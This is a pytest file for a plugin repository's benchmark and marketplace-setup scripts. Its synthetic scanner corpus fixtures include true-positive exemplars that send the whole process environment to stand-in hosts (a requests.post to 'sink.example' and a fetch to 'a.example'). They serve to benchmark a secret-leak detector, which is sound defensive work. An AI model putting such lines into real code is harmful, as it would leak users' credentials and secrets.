"""Unit tests for three previously-untested ``scripts/`` modules.

Covered here (5 tests each, all exercising the REAL functions with REAL
inputs — no mocks, no stubs, no patching of the code under test):

* ``scripts/bench_fp_classifier.py`` — the corpus parser (``parse_corpus``),
  the exemplar → ``Context`` builder (``_build_context``) and the
  precision/recall arithmetic on ``BenchResult``. Corpus files are written
  to ``tmp_path`` in the documented layout so the parser walks real text.

* ``scripts/cpv_validate_benchmark.py`` — the per-phase environment
  composer (``_build_env``), the Markdown table renderer (``_format_table``),
  the report body composer (``_compose_report``) and the worktree-aware
  repo-root resolver (``_resolve_main_root``).

* ``scripts/setup_marketplace_automation.py`` — ``.gitmodules`` parsing,
  plugin notification-workflow classification, README diagram provisioning
  (incl. the dry-run contract), the aggregate status report and the
  end-to-end template copy, all against real temp directories and the
  repo's real ``templates/`` tree.

Deliberately NOT covered: the ``main()`` entry points and
``bench_fp_classifier.run_bench`` / ``cpv_validate_benchmark._run_phase``,
which shell out (``uv run``) or read the repo-global corpus directory —
testing them honestly needs an integration harness, and faking their
dependencies would only test the fake.
"""

from __future__ import annotations

import os
import platform
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))

# Keep the skillaudit result cache inert for parity with the audit protocol
# (nothing here scans, but the imported modules pull in the scanner stack).
os.environ.setdefault("CPV_SCAN_CACHE", "0")

import bench_fp_classifier as bench  # noqa: E402
import cpv_validate_benchmark as vbench  # noqa: E402
import setup_marketplace_automation as sma  # noqa: E402

# ---------------------------------------------------------------------------
# scripts/bench_fp_classifier.py
# ---------------------------------------------------------------------------

_CORPUS_BASIC = """# RC-TEST — synthetic corpus

Prose that the parser must ignore.

## TP exemplars

### TP-1: copy then post to a remote sink

```python
all_env = os.environ.copy()
requests.post("https://sink.example/x", json=all_env)
```

**File role:** source
**Rationale:** the whole env leaves the process.

### TP-2: serialized into an outbound fetch

```javascript
fetch("https://a.example", {body: JSON.stringify(process.env)});
```

**File role:** test | source
**Rationale:** still a real sink.

## FP exemplars

### FP-1: idiomatic env-injection prep

```python
env = os.environ.copy()
subprocess.Popen(cmd, env=env)
```

**File role:** doc
**Rationale:** never leaves the machine.
"""


def _write_corpus(tmp_path: Path, stem: str, text: str) -> Path:
    path = tmp_path / f"{stem}.md"
    path.write_text(text, encoding="utf-8")
    return path


def test_parse_corpus_extracts_labelled_exemplars_with_synthesized_paths(tmp_path: Path) -> None:
    """parse_corpus labels TP/FP by section, numbers titles per label and synthesizes a path from the file role."""
    exemplars = bench.parse_corpus(_write_corpus(tmp_path, "RC-TEST", _CORPUS_BASIC))

    assert [e.title for e in exemplars] == ["TP-1", "TP-2", "FP-1"]
    assert [e.label for e in exemplars] == ["TP", "TP", "FP"]
    assert {e.rule_id for e in exemplars} == {"RC-TEST"}
    # "test | source" collapses to the FIRST alternative, lower-cased.
    assert [e.file_role for e in exemplars] == ["source", "test", "doc"]
    assert [e.file_path for e in exemplars] == [
        "src/example.py",
        "tests/test_example.py",
        "docs/example.md",
    ]
    # The fenced body is captured verbatim (minus surrounding blank lines).
    assert exemplars[0].code.splitlines()[0] == "all_env = os.environ.copy()"
    assert exemplars[1].code.startswith('fetch("https://a.example"')
    assert "subprocess.Popen(cmd, env=env)" in exemplars[2].code
    # Prose after the last fence never leaks into the code block.
    assert "Rationale" not in exemplars[2].code


def test_parse_corpus_reads_file_path_plugin_meta_and_surrounding_overrides(tmp_path: Path) -> None:
    """An explicit File path overrides the synthesized one, Plugin meta / Surrounding blocks are parsed, and malformed meta JSON degrades to None."""
    text = (
        "# RC-87 — manifest rule\n"
        "\n"
        "## FP exemplars\n"
        "\n"
        "### FP-1: manifest keyword\n"
        "\n"
        "```json\n"
        '{"scripts": {"postinstall": "node setup.js"}}\n'
        "```\n"
        "\n"
        "**File role:** source\n"
        "**File path:** `package.json`\n"
        '**Plugin meta:** `{"domain": "clipboard", "hosts": 2}`\n'
        "**Surrounding:** ```\n"
        "UNSAFE_HOSTS = {\n"
        "\n"
        '    "example.test",\n'
        "```\n"
    )
    (exemplar,) = bench.parse_corpus(_write_corpus(tmp_path, "RC-87", text))

    assert exemplar.file_path == "package.json"  # NOT the synthesized src/example.py
    assert exemplar.plugin_meta == {"domain": "clipboard", "hosts": 2}
    # Blank lines inside the Surrounding block are dropped; the rest is kept in order.
    assert exemplar.extra_surrounding == ("UNSAFE_HOSTS = {", '    "example.test",')

    # Same layout, but the meta block is not valid JSON -> parsed as None, never raised.
    broken = text.replace('`{"domain": "clipboard", "hosts": 2}`', '`{"domain": clipboard,}`')
    (broken_exemplar,) = bench.parse_corpus(_write_corpus(tmp_path, "RC-87-broken", broken))
    assert broken_exemplar.plugin_meta is None
    assert broken_exemplar.file_path == "package.json"  # the rest of the block still parses


def test_parse_corpus_skips_fenceless_blocks_without_consuming_a_title_number(tmp_path: Path) -> None:
    """A block with no code fence is silently skipped and does not shift the numbering of later exemplars."""
    text = (
        "# RC-65 — rule\n"
        "\n"
        "## FP exemplars\n"
        "\n"
        "### FP-1: has a fence\n"
        "\n"
        "```python\n"
        "first = 1\n"
        "```\n"
        "\n"
        "**File role:** source\n"
        "\n"
        "### FP-2: prose only, no fence at all\n"
        "\n"
        "This block is malformed and must be dropped.\n"
        "\n"
        "**File role:** source\n"
        "\n"
        "### FP-3: has a fence too\n"
        "\n"
        "```python\n"
        "third = 3\n"
        "```\n"
        "\n"
        "**File role:** source\n"
    )
    exemplars = bench.parse_corpus(_write_corpus(tmp_path, "RC-65", text))

    assert len(exemplars) == 2
    # The dropped block does not burn a number: the survivors are FP-1 and FP-2.
    assert [e.title for e in exemplars] == ["FP-1", "FP-2"]
    assert [e.code for e in exemplars] == ["first = 1", "third = 3"]


def test_build_context_splits_first_nonblank_line_and_appends_extra_surrounding() -> None:
    """_build_context uses the first non-blank code line as `line`, the rest plus extra_surrounding as context."""
    exemplar = bench.Exemplar(
        rule_id="RC-21",
        label="FP",
        title="FP-1",
        code="env = os.environ.copy()\n\n   \nsubprocess.Popen(cmd, env=env)\nreturn env",
        file_role="source",
        file_path="src/runner.py",
        plugin_meta={"domain": "clipboard"},
        extra_surrounding=("UNSAFE_HOSTS = {",),
    )

    ctx = bench._build_context(exemplar, {"domain": "ignored-fallback"})

    assert ctx.rule_id == "RC-21"
    assert ctx.line == "env = os.environ.copy()"
    assert ctx.matched_text == "env = os.environ.copy()"
    assert ctx.line_number == 1
    # Blank/whitespace-only lines are dropped; extra_surrounding is appended last.
    assert ctx.surrounding_lines == (
        "subprocess.Popen(cmd, env=env)",
        "return env",
        "UNSAFE_HOSTS = {",
    )
    assert ctx.file_role == "source"
    assert ctx.file_path == "src/runner.py"
    # The exemplar's own meta wins over the caller-supplied default.
    assert ctx.plugin_meta == {"domain": "clipboard"}


def test_bench_result_precision_and_recall_arithmetic() -> None:
    """BenchResult.precision counts unsuppressed FPs as positives; both properties default to 1.0 on empty input."""
    result = bench.BenchResult(
        rule_id="RC-21",
        tp_total=4,
        tp_classified_real=3,
        fp_total=5,
        fp_classified_fp=4,
    )
    # __post_init__ replaces the None default with a real list.
    assert result.misclassifications == []
    assert result.recall == 0.75  # 3 of 4 TPs kept
    # positives = 3 kept TPs + (5 - 4) = 1 leaked FP -> 3/4
    assert result.precision == 0.75

    empty = bench.BenchResult(rule_id="RC-99")
    assert empty.recall == 1.0
    assert empty.precision == 1.0

    # Every TP suppressed and every FP leaked -> zero precision, zero recall.
    inverted = bench.BenchResult(rule_id="RC-98", tp_total=2, tp_classified_real=0, fp_total=3, fp_classified_fp=0)
    assert inverted.recall == 0.0
    assert inverted.precision == 0.0


# ---------------------------------------------------------------------------
# scripts/cpv_validate_benchmark.py
# ---------------------------------------------------------------------------


def test_build_env_all_serial_pins_every_parallelism_knob_off() -> None:
    """_build_env(validator_parallel=False) sets every CPV_*_PARALLEL knob and the orchestrator to '0'."""
    env = vbench._build_env(orchestrator_parallel=False, validator_parallel=False)

    assert env["CPV_ORCHESTRATOR_PARALLEL"] == "0"
    assert env["PLUGIN_SKIP_GITHUB_INTEGRITY"] == "1"
    assert env["NO_COLOR"] == "1"
    for var in vbench._PER_VALIDATOR_PARALLEL_VARS:
        assert env[var] == "0", f"{var} was not forced serial"


def test_build_env_parallel_phase_unsets_inherited_serial_overrides(monkeypatch) -> None:
    """A '0' left in the caller's shell environment is REMOVED for the parallel phases, not inherited."""
    monkeypatch.setenv("CPV_LINT_PARALLEL", "0")
    monkeypatch.setenv("CPV_SECURITY_PARALLEL", "0")
    monkeypatch.setenv("SOME_UNRELATED_VAR", "keep-me")

    env = vbench._build_env(orchestrator_parallel=True, validator_parallel=True)

    assert env["CPV_ORCHESTRATOR_PARALLEL"] == "1"
    for var in vbench._PER_VALIDATOR_PARALLEL_VARS:
        assert var not in env, f"{var} leaked into the parallel phase"
    # Unrelated environment is preserved (the phase env is a copy, not a reset).
    assert env["SOME_UNRELATED_VAR"] == "keep-me"


def test_format_table_computes_speedup_against_the_first_row() -> None:
    """_format_table renders one row per phase with the speedup taken against row 0's wall time."""
    table = vbench._format_table(
        [
            {"label": "A: all serial", "wall": 8.0},
            {"label": "B: inner parallel", "wall": 4.0},
            {"label": "C: fully parallel", "wall": 3.2},
        ]
    )
    lines = table.splitlines()

    assert lines[0].startswith("| Phase | Wall time (s) |")
    assert lines[1].startswith("|-------|")
    assert lines[2] == "| A: all serial | 8.00 | 1.00× |"
    assert lines[3] == "| B: inner parallel | 4.00 | 2.00× |"
    assert lines[4] == "| C: fully parallel | 3.20 | 2.50× |"
    assert len(lines) == 5


def test_compose_report_carries_speedups_and_per_run_breakdown(tmp_path: Path) -> None:
    """_compose_report embeds the table, the three speedup figures, exit codes, and the per-run section only for multi-run phases."""
    sys_info = {
        "platform": "Test-Platform-1.0",
        "machine": "arm64",
        "python": "3.12.0",
        "cpu_count": "8",
        "cpu_brand": "TestCPU",
    }
    rows = [
        {"label": "A: all serial", "wall": 10.0, "exit_code": 0, "runs": [10.0, 11.0]},
        {"label": "B: inner parallel", "wall": 5.0, "exit_code": 0, "runs": [5.0, 5.5]},
        {"label": "C: fully parallel", "wall": 2.5, "exit_code": 3, "runs": [2.5, 2.6]},
    ]
    table = vbench._format_table(rows)

    body = vbench._compose_report(tmp_path / "plugin", sys_info, rows, table)

    assert table in body
    assert "- **Platform:** Test-Platform-1.0" in body
    assert "- Fully-parallel vs serial baseline: **4.00×**" in body
    assert "- Inner-only (sibling validators)     **2.00×**" in body
    assert "- Outer-layer contribution (C vs B): **2.00×**" in body
    assert "- **C: fully parallel**: exit=3, median wall=2.50s" in body
    assert "## Per-run wall times" in body
    assert "- **A: all serial**: 10.00, 11.00 s" in body

    # A single-run benchmark has no variance to show, so the section is omitted.
    single = [dict(row, runs=[row["wall"]]) for row in rows]
    body_single = vbench._compose_report(tmp_path / "plugin", sys_info, single, table)
    assert "## Per-run wall times" not in body_single


def test_resolve_main_root_points_at_the_checkout_holding_this_script() -> None:
    """_resolve_main_root returns a real directory that contains the benchmark script it lives beside."""
    root = vbench._resolve_main_root()

    assert root.is_dir()
    assert (root / "scripts" / "cpv_validate_benchmark.py").is_file()
    assert root.is_absolute()
    # Sanity: the resolver must not hand back the scripts/ dir itself.
    assert root.name != "scripts"
    # The system-info helper reports this interpreter, not a hardcoded value.
    assert vbench._system_info()["python"] == sys.version.split()[0]
    assert vbench._system_info()["machine"] == platform.machine()


# ---------------------------------------------------------------------------
# scripts/setup_marketplace_automation.py
# ---------------------------------------------------------------------------


def _make_marketplace(tmp_path: Path, *, gitmodules: str | None = None) -> Path:
    root = tmp_path / "my-marketplace"
    (root / ".claude-plugin").mkdir(parents=True)
    (root / ".claude-plugin" / "marketplace.json").write_text('{"name": "my-marketplace", "plugins": []}', encoding="utf-8")
    if gitmodules is not None:
        (root / ".gitmodules").write_text(gitmodules, encoding="utf-8")
    return root


_GITMODULES = """[submodule "plugin-a"]
\tpath = plugins/plugin-a
\turl = https://github.com/Example/plugin-a.git
[submodule "plugin-b"]
\tpath = plugins/plugin-b
\turl = https://github.com/Example/plugin-b.git
"""


def test_get_submodule_paths_parses_every_entry_and_returns_empty_without_gitmodules(tmp_path: Path) -> None:
    """get_submodule_paths reads name/path/url for each .gitmodules entry, and returns [] when the file is absent."""
    root = _make_marketplace(tmp_path, gitmodules=_GITMODULES)

    submodules = sma.get_submodule_paths(root)

    assert submodules == [
        {"name": "plugin-a", "path": "plugins/plugin-a", "url": "https://github.com/Example/plugin-a.git"},
        {"name": "plugin-b", "path": "plugins/plugin-b", "url": "https://github.com/Example/plugin-b.git"},
    ]
    assert sma.get_submodule_paths(_make_marketplace(tmp_path / "other")) == []


def test_check_plugin_notification_workflow_detects_missing_placeholder_and_configured(tmp_path: Path) -> None:
    """The workflow check reports absence, unconfigured placeholders, and a fully configured workflow distinctly."""
    configured_body = "env:\n  MARKETPLACE_OWNER: 'Emasoft'\n  MARKETPLACE_REPO: 'claude-plugins-marketplace'\n"
    placeholder_body = "env:\n  MARKETPLACE_OWNER: 'YOUR-GITHUB-USERNAME'\n  MARKETPLACE_REPO: 'my-repo'\n"

    missing = tmp_path / "missing"
    missing.mkdir()
    status_missing = sma.check_plugin_notification_workflow(missing)
    assert status_missing["has_workflow"] is False
    assert status_missing["needs_configuration"] is False
    assert status_missing["workflow_path"].endswith("/.github/workflows/notify-marketplace.yml")

    for name, body, expected in (("placeholder", placeholder_body, True), ("configured", configured_body, False)):
        plugin = tmp_path / name
        wf = plugin / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "notify-marketplace.yml").write_text(body, encoding="utf-8")
        status = sma.check_plugin_notification_workflow(plugin)
        assert status["has_workflow"] is True
        assert status["needs_configuration"] is expected, f"{name} misclassified"


def test_setup_readme_with_diagram_appends_once_and_honours_dry_run(tmp_path: Path) -> None:
    """The README helper appends the mermaid architecture section only when missing, and writes nothing in dry-run."""
    root = _make_marketplace(tmp_path)
    readme = root / "README.md"
    readme.write_text("# my-marketplace\n\nSome prose.\n", encoding="utf-8")

    # Dry run: reports success but leaves the file byte-identical.
    before = readme.read_text(encoding="utf-8")
    assert sma.setup_readme_with_diagram(root, dry_run=True, verbose=False) is True
    assert readme.read_text(encoding="utf-8") == before

    assert sma.setup_readme_with_diagram(root, dry_run=False, verbose=False) is True
    after_first = readme.read_text(encoding="utf-8")
    assert after_first.startswith("# my-marketplace\n\nSome prose.\n")
    assert "```mermaid" in after_first
    assert "sync_marketplace_versions.py" in after_first

    # Idempotent: a README that already has a diagram is left alone.
    assert sma.setup_readme_with_diagram(root, dry_run=False, verbose=False) is True
    assert readme.read_text(encoding="utf-8") == after_first
    assert after_first.count("```mermaid") == 1


def test_get_full_status_reports_components_and_plugin_counts(tmp_path: Path) -> None:
    """get_full_status short-circuits on a non-marketplace dir and otherwise tallies workflows, scripts, README and plugins."""
    not_a_marketplace = tmp_path / "plain-dir"
    not_a_marketplace.mkdir()
    bad = sma.get_full_status(not_a_marketplace, verbose=False)
    assert bad["is_valid_marketplace"] is False
    assert bad["plugins"]["total"] == 0
    assert bad["workflows"]["update_submodules"]["exists"] is False

    root = _make_marketplace(tmp_path, gitmodules=_GITMODULES)
    (root / ".github" / "workflows").mkdir(parents=True)
    (root / ".github" / "workflows" / "update-submodules.yml").write_text("name: update\n", encoding="utf-8")
    (root / "scripts").mkdir()
    (root / "scripts" / "sync_marketplace_versions.py").write_text("# sync\n", encoding="utf-8")
    (root / "README.md").write_text("# md\n\n```mermaid\nflowchart TB\n```\n", encoding="utf-8")
    # plugin-a is configured; plugin-b still carries the template placeholder.
    for name, body in (
        ("plugin-a", "MARKETPLACE_OWNER: 'Emasoft'\n"),
        ("plugin-b", "MARKETPLACE_OWNER: 'your-github-username'\n"),
    ):
        wf = root / "plugins" / name / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "notify-marketplace.yml").write_text(body, encoding="utf-8")

    status = sma.get_full_status(root, verbose=False)

    assert status["is_valid_marketplace"] is True
    assert status["marketplace_dir"] == str(root)
    assert status["workflows"]["update_submodules"]["exists"] is True
    assert status["scripts"]["sync_versions"]["exists"] is True
    assert status["scripts"]["notify_template"]["exists"] is False
    assert status["readme"]["exists"] is True
    assert status["readme"]["has_diagram"] is True
    assert status["plugins"] == {"total": 2, "configured": 1, "needs_config": 1, "missing": 0}


def test_setup_marketplace_automation_copies_real_templates_and_rejects_non_marketplaces(tmp_path: Path) -> None:
    """setup_marketplace_automation refuses a dir with no marketplace.json and otherwise installs the shipped templates."""
    plain = tmp_path / "not-a-marketplace"
    plain.mkdir()
    assert sma.setup_marketplace_automation(plain, dry_run=False, verbose=False) is False
    assert not (plain / ".github").exists()

    root = _make_marketplace(tmp_path)
    # Dry run creates nothing.
    assert sma.setup_marketplace_automation(root, dry_run=True, verbose=False) is True
    assert not (root / ".github" / "workflows" / "update-submodules.yml").exists()

    assert sma.setup_marketplace_automation(root, dry_run=False, verbose=False) is True
    workflow = root / ".github" / "workflows" / "update-submodules.yml"
    sync_script = root / "scripts" / "sync_marketplace_versions.py"
    template_dir = sma.get_template_dir()
    assert workflow.read_text(encoding="utf-8") == (template_dir / "github-workflows" / "update-submodules.yml").read_text(encoding="utf-8")
    assert sync_script.read_text(encoding="utf-8") == (template_dir / "scripts" / "sync_marketplace_versions.py").read_text(encoding="utf-8")
    assert sync_script.stat().st_mode & 0o111, "sync script must be made executable"
    assert (root / "scripts" / "notify-marketplace.yml.template").is_file()


# ─────────────────────────────────────────────────────────────────────────────
# Latent defects found while writing the tests above, then fixed.
#
# Two of the four reported were real and one was not: the claimed
# ZeroDivisionError in `cpv_validate_benchmark._compose_report` does not exist —
# all three quotients are guarded, and `rows` is built from a hard-coded 3-phase
# list so `rows[1]` / `rows[-1]` always exist. It is left alone deliberately;
# "hardening" a division that cannot divide by zero would only add a branch no
# test can reach.
# ─────────────────────────────────────────────────────────────────────────────
_CORPUS_MISFILED = """# RC-MIS — misfiled block

## TP exemplars

### TP-1: a real one

```python
os.system(cmd)
```

**File role:** source

### FP-1: filed under the WRONG heading

```python
print("harmless")
```

**File role:** doc
"""


def test_parse_corpus_labels_a_block_by_its_own_prefix_not_its_section(tmp_path: Path) -> None:
    """A `### FP-1:` under `## TP exemplars` is an FP — the block's prefix wins."""
    exemplars = bench.parse_corpus(_write_corpus(tmp_path, "RC-MIS", _CORPUS_MISFILED))
    assert [e.label for e in exemplars] == ["TP", "FP"], (
        "a misfiled block was counted on the wrong side of the precision/recall ledger"
    )
    # The title must not relabel it either — that erased the evidence of the typo.
    assert [e.title for e in exemplars] == ["TP-1", "FP-1"]


def test_parse_corpus_still_requires_a_tp_or_fp_section(tmp_path: Path) -> None:
    """CONTROL: the section still gates whether a block counts at all."""
    orphan = "# RC-ORPHAN\n\n### TP-1: outside any section\n\n```python\nx = 1\n```\n"
    assert bench.parse_corpus(_write_corpus(tmp_path, "RC-ORPHAN", orphan)) == []


def test_get_submodule_paths_always_seeds_a_url_key(tmp_path: Path) -> None:
    """A stanza with no `url` still returns the same dict shape (no KeyError downstream)."""
    root = _make_marketplace(tmp_path, gitmodules='[submodule "a"]\n\tpath = plugins/a\n')
    (entry,) = sma.get_submodule_paths(root)
    assert entry["url"] == "", "url must be seeded like path, not absent"
    assert entry["path"] == "plugins/a"


def test_missing_notify_template_is_reported_instead_of_silently_skipped(
    tmp_path: Path, monkeypatch, capsys
) -> None:
    """A missing reference template warns loudly; it does not fail the setup.

    It used to fall through with NO output, so the run printed "Setup complete!"
    while the file the next step tells you to copy was never created.
    """
    real_templates = sma.get_template_dir()
    fake = tmp_path / "templates"
    (fake / "github-workflows").mkdir(parents=True)
    (fake / "scripts").mkdir(parents=True)
    # Everything present EXCEPT the notify template.
    for rel in ("github-workflows/update-submodules.yml", "scripts/sync_marketplace_versions.py"):
        (fake / rel).write_text((real_templates / rel).read_text(encoding="utf-8"), encoding="utf-8")
    monkeypatch.setattr(sma, "get_template_dir", lambda: fake)

    root = _make_marketplace(tmp_path)
    assert sma.setup_marketplace_automation(root, dry_run=False, verbose=False) is True, (
        "a missing REFERENCE template must not fail a setup that otherwise worked"
    )
    assert "notify-marketplace.yml template not found" in capsys.readouterr().err
    assert not (root / "scripts" / "notify-marketplace.yml.template").exists()
